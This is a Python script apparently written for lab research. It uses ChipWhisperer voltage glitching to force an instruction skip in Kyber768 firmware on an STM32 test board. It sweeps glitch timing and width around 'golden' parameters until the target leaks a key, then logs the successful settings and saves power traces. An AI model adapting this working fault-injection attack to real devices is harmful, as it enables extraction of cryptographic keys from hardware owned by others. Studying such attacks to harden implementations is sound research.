#!/usr/bin/env python3
"""
Kyber768 Instruction Skip Attack - Refined Version
Based on AES loop skip attack techniques
Golden Parameters: ext_offset=17, width=4, offset=-12

Key improvements from AES notebook:
1. Micro-jitter around golden parameters for timing drift
2. Better reset handling on crashes
3. Configurable parameter ranges for fine-tuning
"""

import chipwhisperer as cw
import time
import numpy as np
import os
import random

# Configuration
FW_PATH = "bin/test_glitch.hex"

# Golden parameters (previously successful)
GOLDEN_EXT_OFFSET = 17
GOLDEN_WIDTH = 4
GOLDEN_OFFSET = -12

# Micro-scan jitter ranges (±values around golden)
EXT_OFFSET_JITTER = 5   # Search 12-22
WIDTH_JITTER = 3        # Search 1-7
OFFSET_JITTER = 5       # Search -17 to -7

def setup_scope_and_target():
    """Initialize ChipWhisperer with verified working settings"""
    print("Connecting to ChipWhisperer...")
    try:
        scope = cw.scope()
        target = cw.target(scope)
    except Exception as e:
        print(f"Connection failed: {e}")
        return None, None
    
    # Standard setup
    scope.default_setup()
    
    # Clock settings (from AES notebook - verified working)
    scope.clock.clkgen_freq = 7372800
    scope.clock.adc_src = "clkgen_x4"
    
    # Serial configuration
    scope.io.tio1 = "serial_rx"
    scope.io.tio2 = "serial_tx"
    scope.trigger.triggers = "tio4"
    target.baud = 38400
    
    # Glitch settings for voltage glitch - same as AES
    scope.glitch.clk_src = "clkgen"
    scope.glitch.output = "enable_only"  # Voltage glitch mode
    scope.glitch.trigger_src = "ext_single"
    scope.io.glitch_lp = True
    scope.io.glitch_hp = True
    
    # Start with golden parameters
    scope.glitch.ext_offset = GOLDEN_EXT_OFFSET
    scope.glitch.width = GOLDEN_WIDTH
    scope.glitch.offset = GOLDEN_OFFSET
    scope.glitch.repeat = 1
    
    return scope, target

def read_until(target, term, timeout_ms=2000):
    """Read from target until term is found or timeout"""
    result = ""
    start = time.time()
    while (time.time() - start) * 1000 < timeout_ms:
        if target.in_waiting():
            data = target.read()
            result += data
            if term in result:
                return result
        time.sleep(0.01)
    return result if result else None

def reboot_flush(scope, target):
    """Reset target and wait for boot - from AES notebook"""
    scope.io.nrst = False
    time.sleep(0.05)
    scope.io.nrst = "high_z"
    time.sleep(0.05)
    target.flush()

def reset_target(scope, target):
    """Reset target and wait for boot"""
    scope.io.nrst = 'low'
    time.sleep(0.1)
    scope.io.nrst = 'high'
    time.sleep(0.5)
    target.flush()

def get_jittered_params():
    """Generate parameters with micro-jitter around golden values"""
    ext_offset = GOLDEN_EXT_OFFSET + random.randint(-EXT_OFFSET_JITTER, EXT_OFFSET_JITTER)
    width = max(1, GOLDEN_WIDTH + random.randint(-WIDTH_JITTER, WIDTH_JITTER))
    offset = GOLDEN_OFFSET + random.randint(-OFFSET_JITTER, OFFSET_JITTER)
    return ext_offset, width, offset

def run_scan_mode(scope, target, TARGET_KEY):
    """Systematic scan around golden parameters"""
    print("\nSYSTEMATIC SCAN around golden parameters")
    print("="*50)
    
    total = 0
    crashes = 0
    successes = 0
    max_attempts = 20000
    
    # Generate scan ranges
    ext_range = range(GOLDEN_EXT_OFFSET - EXT_OFFSET_JITTER, 
                      GOLDEN_EXT_OFFSET + EXT_OFFSET_JITTER + 1)
    width_range = range(max(1, GOLDEN_WIDTH - WIDTH_JITTER), 
                        GOLDEN_WIDTH + WIDTH_JITTER + 1)
    offset_range = range(GOLDEN_OFFSET - OFFSET_JITTER, 
                         GOLDEN_OFFSET + OFFSET_JITTER + 1)
    
    for ext_offset in ext_range:
        for width in width_range:
            for offset in offset_range:
                scope.glitch.ext_offset = ext_offset
                scope.glitch.width = width
                scope.glitch.offset = offset
                
                # Run multiple attempts at each setting
                for attempt in range(10):
                    target.flush()
                    
                    msg = read_until(target, "WAIT", 500)
                    if not msg or "WAIT" not in msg:
                        crashes += 1
                        if crashes % 10 == 0:
                            reset_target(scope, target)
                            read_until(target, "WAIT", 2000)
                        continue
                    
                    scope.arm()
                    ret = scope.capture()
                    
                    if ret:
                        crashes += 1
                        if crashes % 10 == 0:
                            reset_target(scope, target)
                        continue
                    
                    resp = read_until(target, "\n", 500)
                    
                    if resp and TARGET_KEY in resp:
                        successes += 1
                        print(f"\n\n{'='*50}")
                        print("[SUCCESS] INSTRUCTION SKIP CONFIRMED!")
                        print(f"{'='*50}")
                        print(f"ext_offset={ext_offset}, width={width}, offset={offset}")
                        print(f"Attempt: {total}")
                        print(f"Key: {TARGET_KEY}")
                        print(f"{'='*50}")
                        
                        # Save to file
                        with open("instruction_skip_successes.txt", "a") as f:
                            f.write(f"{ext_offset},{width},{offset}\n")
                        
                        trace = scope.get_last_trace()
                        np.save(f"traces_repro/success_e{ext_offset}_w{width}_o{offset}.npy", trace)
                        return True
                    
                    total += 1
                    
                if total % 100 == 0:
                    rate = crashes / total * 100 if total > 0 else 0
                    print(f"Scan: ext={ext_offset},w={width},o={offset} | Attempts {total}, Crashes: {crashes} ({rate:.1f}%)", end="\r")
                    
                if total >= max_attempts:
                    return False
    
    print(f"\nNo success after {total} attempts ({crashes} crashes).")
    return False

def run_jitter_mode(scope, target, TARGET_KEY):
    """Random jitter around golden parameters - probabilistic approach"""
    print("\nRANDOM JITTER mode around golden parameters")
    print("="*50)
    
    total = 0
    crashes = 0
    successes = 0
    max_attempts = 20000
    
    while successes == 0 and total < max_attempts:
        # Apply random jitter
        ext_offset, width, offset = get_jittered_params()
        scope.glitch.ext_offset = ext_offset
        scope.glitch.width = width
        scope.glitch.offset = offset
        
        target.flush()
        
        msg = read_until(target, "WAIT", 500)
        if not msg or "WAIT" not in msg:
            crashes += 1
            if crashes % 10 == 0:
                reset_target(scope, target)
                read_until(target, "WAIT", 2000)
            continue
        
        scope.arm()
        ret = scope.capture()
        
        if ret:
            crashes += 1
            if crashes % 10 == 0:
                reset_target(scope, target)
            continue
        
        resp = read_until(target, "\n", 500)
        
        if resp and TARGET_KEY in resp:
            successes += 1
            print(f"\n\n{'='*50}")
            print("[SUCCESS] INSTRUCTION SKIP CONFIRMED!")
            print(f"{'='*50}")
            print(f"ext_offset={ext_offset}, width={width}, offset={offset}")
            print(f"Attempt: {total}")
            print(f"Key: {TARGET_KEY}")
            print(f"{'='*50}")
            
            with open("instruction_skip_successes.txt", "a") as f:
                f.write(f"{ext_offset},{width},{offset}\n")
            
            trace = scope.get_last_trace()
            np.save(f"traces_repro/success_jitter_e{ext_offset}_w{width}_o{offset}.npy", trace)
            break
        
        total += 1
        if total % 100 == 0:
            rate = crashes / total * 100 if total > 0 else 0
            print(f"Jitter [{ext_offset},{width},{offset}] | Attempts {total}, Crashes: {crashes} ({rate:.1f}%)", end="\r")
    
    if successes == 0:
        print(f"\nNo success after {total} attempts ({crashes} crashes).")
    
    return successes > 0

def main():
    scope, target = setup_scope_and_target()
    if not scope:
        return
    
    # Program target
    print(f"Programming {FW_PATH}...")
    try:
        cw.program_target(scope, cw.programmers.STM32FProgrammer, FW_PATH)
        print("Programming successful!")
    except Exception as e:
        print(f"Programming failed: {e}")
        print("Please power-cycle the board and try again.")
        scope.dis()
        return
    
    # Reset and wait for init
    reset_target(scope, target)
    
    print("Waiting for target initialization...")
    
    # Read all output for 5 seconds to get complete boot sequence
    all_output = ""
    start_time = time.time()
    while time.time() - start_time < 5:
        if target.in_waiting():
            all_output += target.read()
        time.sleep(0.05)
    
    print(f"Boot output:\n{all_output}")
    
    if "KEYS GENERATED" not in all_output:
        print("Target did not initialize. Check connections.")
        scope.dis()
        target.dis()
        return
    
    # Extract target key from GOLD: line
    TARGET_KEY = None
    if "GOLD: " in all_output:
        idx = all_output.index("GOLD: ") + 6
        remaining = all_output[idx:].strip()
        TARGET_KEY = remaining.split()[0] if remaining else None
        print(f"Target Key: {TARGET_KEY}")
    
    if not TARGET_KEY or len(TARGET_KEY) < 32:
        print(f"Invalid target key: {TARGET_KEY}")
        scope.dis()
        target.dis()
        return
    
    # Create output directory
    os.makedirs("traces_repro", exist_ok=True)
    
    print("\n" + "="*50)
    print("ATTACK PARAMETERS (Golden + Jitter)")
    print("="*50)
    print(f"Golden ext_offset = {GOLDEN_EXT_OFFSET} (± {EXT_OFFSET_JITTER})")
    print(f"Golden width      = {GOLDEN_WIDTH} (± {WIDTH_JITTER})")
    print(f"Golden offset     = {GOLDEN_OFFSET} (± {OFFSET_JITTER})")
    print(f"output            = {scope.glitch.output}")
    print("="*50)
    
    # Mode selection
    print("\nSelect attack mode:")
    print("1. Random Jitter (probabilistic, faster)")
    print("2. Systematic Scan (exhaustive, slower)")
    print("3. Both (jitter first, then scan)")
    
    mode = input("Enter choice [1/2/3] (default: 1): ").strip() or "1"
    
    if mode == "1":
        run_jitter_mode(scope, target, TARGET_KEY)
    elif mode == "2":
        run_scan_mode(scope, target, TARGET_KEY)
    else:
        if not run_jitter_mode(scope, target, TARGET_KEY):
            print("\nJitter mode failed, trying systematic scan...")
            run_scan_mode(scope, target, TARGET_KEY)
    
    scope.dis()
    target.dis()

if __name__ == "__main__":
    main()
